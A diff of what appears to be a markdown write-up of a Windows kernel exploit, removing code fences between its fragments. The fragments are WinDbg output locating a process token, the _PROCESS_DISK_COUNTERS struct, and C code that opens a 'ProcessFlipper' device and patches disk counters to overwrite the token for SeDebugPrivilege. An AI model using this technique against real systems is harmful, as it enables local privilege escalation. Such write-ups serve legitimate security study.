@@ -37,11 +37,6 @@ ffffc703`d61b1940  00000000`00000000
 kd> dqs ffffc703`d61b1080 + 4b8 l2
 ffffc703`d61b1538  ffff848a`436c0064     <---- token
 ffffc703`d61b1540  00000000`00000000
-```
-
-
-
-```
 //0x28 bytes (sizeof)
 struct _PROCESS_DISK_COUNTERS
 {
@@ -51,12 +46,7 @@ struct _PROCESS_DISK_COUNTERS
     ULONGLONG WriteOperationCount;                                          //0x18
     ULONGLONG FlushOperationCount;                                          //0x20
 };
-```
-
-
-
-```
-#define ProcessFlipper "\\.\ProcessFlipper"
+    #define ProcessFlipper "\\.\ProcessFlipper"
 
 HANDLE file = CreateFileA(ProcessFlipper, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 if (file == INVALID_HANDLE_VALUE) {
@@ -66,11 +56,6 @@ if (file == INVALID_HANDLE_VALUE) {
 else {
  printf("[+] ProcessFlipper handle : 0x%08Xn", (INT)file);
 }
-```
-
-
-
-```
 bool patch_diskcounter(HANDLE file)
 {
  ULONG value = tokenoffset + 0x80 - 0x8;     // add 0x80 to point to token and subtract to get pointed by BytesWritten 
@@ -89,11 +74,6 @@ bool patch_diskcounter(HANDLE file)
 
  return TRUE;
 }
-```
-
-
-
-```
 int EnableSeDebugPrivilege()
 {
  SYSTEM_PROCESS_INFORMATION spi;
